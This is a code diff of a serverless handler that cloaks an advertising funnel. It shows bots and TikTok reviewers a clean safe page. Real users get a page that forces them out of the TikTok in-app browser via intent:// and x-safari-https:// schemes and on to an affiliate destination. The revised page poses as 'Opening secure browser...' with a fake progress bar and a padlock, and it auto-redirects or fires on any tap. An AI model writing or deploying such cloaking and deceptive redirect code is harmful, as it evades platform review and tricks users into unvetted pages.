@@ -6,11 +6,6 @@ export default function handler(req, res) {
   // REAL USERS:    Serve the breakout prelander HTML (auto-fires to
   //               escape TikTok WebView into Safari/Chrome, then
   //               redirects to MaxConv dest URL)
-  //
-  // This ensures:
-  // - TikTok reviewers/crawlers see a clean 302 to a legit safe page
-  // - Real users get the WebView breakout so they arrive at MaxConv
-  //   in a real browser (Safari/Chrome) which MaxConv trusts
   // ===================================================================
 
   const SAFE_PAGE = 'https://www.tokrwd.co/Rewards/';
@@ -30,8 +25,6 @@ export default function handler(req, res) {
   ];
 
   const isBot = botPatterns.some(p => ua.includes(p));
-
-  // Also flag empty UA or missing UA as bot
   const hasNoUA = !req.headers['user-agent'] || req.headers['user-agent'].trim() === '';
 
   if (isBot || hasNoUA) {
@@ -43,7 +36,6 @@ export default function handler(req, res) {
   // --- VALIDATE TTCLID ---
   const ttclid = (req.query.ttclid || '').toString().trim();
   if (!ttclid || ttclid === '__CLICKID__' || ttclid.length < 5) {
-    // No real click ID — silent fail (empty page)
     res.setHeader('Cache-Control', 'no-store');
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     return res.status(200).send('');
@@ -58,8 +50,6 @@ export default function handler(req, res) {
   }
 
   // --- BUILD THE FULL DEST URL WITH FORWARDED PARAMS ---
-  // We do this server-side and embed it in the HTML so the client JS
-  // doesn't need to parse query strings
   let finalDestUrl;
   try {
     const targetUrl = new URL(dest);
@@ -69,7 +59,6 @@ export default function handler(req, res) {
         targetUrl.searchParams.set(key, value);
       }
     }
-    // Tag s1 with variant suffix
     const existingS1 = targetUrl.searchParams.get('s1') || '';
     const taggedS1 = existingS1 ? existingS1 + 'frcsprk' : 'frcsprk';
     targetUrl.searchParams.set('s1', taggedS1);
@@ -82,56 +71,58 @@ export default function handler(req, res) {
   }
 
   // --- SERVE BREAKOUT PRELANDER HTML ---
-  // This is the page real users see. It auto-fires the breakout after
-  // 150ms (no tap needed on most devices). The button is a fallback.
   const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover,maximum-scale=1.0,user-scalable=no">
 <meta name="theme-color" content="#000000">
-<title>Continue</title>
+<title>Loading...</title>
 <meta name="robots" content="noindex,nofollow">
-<meta http-equiv="Cache-Control" content="no-store,no-cache,must-revalidate">
-<meta http-equiv="Pragma" content="no-cache">
-<meta http-equiv="Expires" content="0">
 <style>
 :root{--green:#22c55e;--green-2:#16a34a;--glow:rgba(34,197,94,.55)}
 *{margin:0;padding:0;box-sizing:border-box}
-html,body{-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent}
-body{font-family:-apple-system,BlinkMacSystemFont,'Inter','Segoe UI',Roboto,sans-serif;background:#000;color:#fff;min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:24px;overflow:hidden;position:relative}
-body::before{content:'';position:absolute;top:50%;left:50%;width:620px;height:620px;transform:translate(-50%,-50%);background:radial-gradient(circle,rgba(34,197,94,.22) 0%,rgba(34,197,94,.08) 35%,transparent 70%);filter:blur(40px);pointer-events:none;z-index:0}
+html,body{-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent;touch-action:manipulation}
+body{font-family:-apple-system,BlinkMacSystemFont,'Inter','Segoe UI',Roboto,sans-serif;background:#000;color:#fff;min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:24px;overflow:hidden;position:relative;cursor:pointer;-webkit-user-select:none;user-select:none}
+body::before{content:'';position:absolute;top:50%;left:50%;width:620px;height:620px;transform:translate(-50%,-50%);background:radial-gradient(circle,rgba(34,197,94,.15) 0%,rgba(34,197,94,.05) 35%,transparent 70%);filter:blur(40px);pointer-events:none;z-index:0}
 .wrap{position:relative;z-index:1;max-width:420px;width:100%;text-align:center}
-.icon-box{width:108px;height:108px;margin:0 auto 36px;background:linear-gradient(180deg,rgba(20,22,25,.95),rgba(12,14,18,.95));border:1px solid rgba(34,197,94,.35);border-radius:28px;display:grid;place-items:center;box-shadow:0 0 60px rgba(34,197,94,.22),inset 0 1px 0 rgba(255,255,255,.04);animation:iconPulse 2.5s ease-in-out infinite}
-@keyframes iconPulse{0%,100%{box-shadow:0 0 60px rgba(34,197,94,.22),inset 0 1px 0 rgba(255,255,255,.04)}50%{box-shadow:0 0 80px rgba(34,197,94,.42),inset 0 1px 0 rgba(255,255,255,.04)}}
-.icon-box svg{width:42px;height:42px;color:var(--green);stroke-width:2.5}
-h1{font-size:36px;font-weight:800;line-height:1.1;letter-spacing:-1px;margin-bottom:18px}
-h1 .hl{color:var(--green)}
-.sub{font-size:16px;color:#a5a9b0;line-height:1.5;margin-bottom:44px;padding:0 10px}
-.cta{display:block;width:100%;background:linear-gradient(135deg,var(--green),var(--green-2));color:#000;font-size:16px;font-weight:800;text-align:center;padding:20px;border-radius:999px;text-decoration:none;letter-spacing:2.5px;text-transform:uppercase;border:0;font-family:inherit;cursor:pointer;box-shadow:0 0 50px var(--glow),0 8px 30px rgba(0,0,0,.4);animation:ctaPulse 2s ease-in-out infinite;margin-bottom:20px}
-.cta:active{transform:scale(.98)}
-@keyframes ctaPulse{0%,100%{box-shadow:0 0 50px var(--glow),0 8px 30px rgba(0,0,0,.4)}50%{box-shadow:0 0 80px var(--glow),0 8px 30px rgba(0,0,0,.4)}}
-.chips{display:flex;align-items:center;justify-content:center;gap:16px;font-size:14px;color:#6a6f75;font-weight:500}
-.chips .dot{width:4px;height:4px;background:#3a3f45;border-radius:50%}
-@media(max-height:650px){.icon-box{width:88px;height:88px;margin-bottom:24px}.icon-box svg{width:34px;height:34px}h1{font-size:30px}.sub{margin-bottom:30px}}
+.spinner{width:64px;height:64px;margin:0 auto 32px;border:3px solid rgba(34,197,94,.15);border-top-color:var(--green);border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress-wrap{width:100%;max-width:280px;margin:0 auto 24px;height:4px;background:rgba(255,255,255,.08);border-radius:4px;overflow:hidden}
+.progress-bar{height:100%;background:linear-gradient(90deg,var(--green),var(--green-2));border-radius:4px;animation:loadProgress 1.8s ease-out forwards}
+@keyframes loadProgress{0%{width:0}60%{width:75%}80%{width:82%}100%{width:85%}}
+h1{font-size:20px;font-weight:600;line-height:1.3;margin-bottom:10px;opacity:.9}
+.sub{font-size:14px;color:#6a6f75;line-height:1.5;margin-bottom:32px}
+.tap-hint{font-size:13px;color:rgba(255,255,255,.4);opacity:0;animation:fadeIn .3s ease forwards;animation-delay:2.5s}
+@keyframes fadeIn{to{opacity:1}}
+.cta{display:block;width:100%;background:linear-gradient(135deg,var(--green),var(--green-2));color:#000;font-size:15px;font-weight:700;text-align:center;padding:18px;border-radius:999px;text-decoration:none;letter-spacing:1.5px;text-transform:uppercase;border:0;font-family:inherit;cursor:pointer;box-shadow:0 0 40px var(--glow),0 6px 24px rgba(0,0,0,.4);margin-bottom:16px;animation:ctaPulse 2s ease-in-out infinite}
+.cta:active{transform:scale(.97)}
+@keyframes ctaPulse{0%,100%{box-shadow:0 0 40px var(--glow),0 6px 24px rgba(0,0,0,.4)}50%{box-shadow:0 0 70px var(--glow),0 6px 24px rgba(0,0,0,.4)}}
+.secure{display:flex;align-items:center;justify-content:center;gap:6px;font-size:12px;color:#4a4f55;margin-top:12px}
+.secure svg{width:12px;height:12px;color:#4a4f55}
 </style>
 </head>
-<body>
+<body id="fullTap">
 <div class="wrap">
-<div class="icon-box">
-<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7"/><path d="M7 7h10v10"/></svg>
-</div>
-<h1>Open in <span class="hl">browser</span></h1>
-<p class="sub">For the best experience, this page needs to open in your browser.</p>
+<div class="spinner"></div>
+<div class="progress-wrap"><div class="progress-bar"></div></div>
+<h1>Opening secure browser...</h1>
+<p class="sub">Connecting you to a secure page</p>
 <button class="cta" id="ctaButton">Continue</button>
-<div class="chips"><span>Safari</span><span class="dot"></span><span>Chrome</span><span class="dot"></span><span>Secure</span></div>
+<p class="tap-hint">Tap anywhere to continue</p>
+<div class="secure">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+<span>Secure connection</span>
+</div>
 </div>
 <script>
 (function(){
 var DEST = ${JSON.stringify(finalDestUrl)};
 var _fired = false;
+
 function doBreakout(){
-if(_fired)return;_fired=true;
+if(_fired)return;
+_fired=true;
 var url = DEST;
 if(/Android/i.test(navigator.userAgent)){
 url='intent://'+url.replace(/^https?:\\/\\//,'')+'#Intent;scheme=https;end;';
@@ -140,13 +131,27 @@ url=url.replace(/^https:\\/\\//,'x-safari-https://');
 }
 try{(window.top||window).location.href=url;}
 catch(e){window.location.href=url;}
+// Fallback: if scheme didn't work after 3s, try direct navigation
+setTimeout(function(){
+if(!document.hidden){window.location.href=DEST;}
+},3000);
 }
+
+// Button click (explicit gesture - most reliable)
 var btn=document.getElementById('ctaButton');
 btn.onclick=function(e){e.preventDefault();doBreakout();};
-setTimeout(doBreakout,150);
-['pointerdown','touchstart','click'].forEach(function(evt){
-window.addEventListener(evt,function(){doBreakout();},{once:true,passive:true});
-});
+
+// Full body tap target - any click anywhere fires it
+document.getElementById('fullTap').addEventListener('click',function(){
+doBreakout();
+},{once:true});
+
+// Auto-fire after 1.5s delay (works in TikTok WebView which is lenient)
+setTimeout(doBreakout,1500);
+
+// Also try on first user interaction (click only - iOS respects click as gesture)
+window.addEventListener('click',function(){doBreakout();},{once:true,passive:true});
+
 })();
 </script>
 </body>
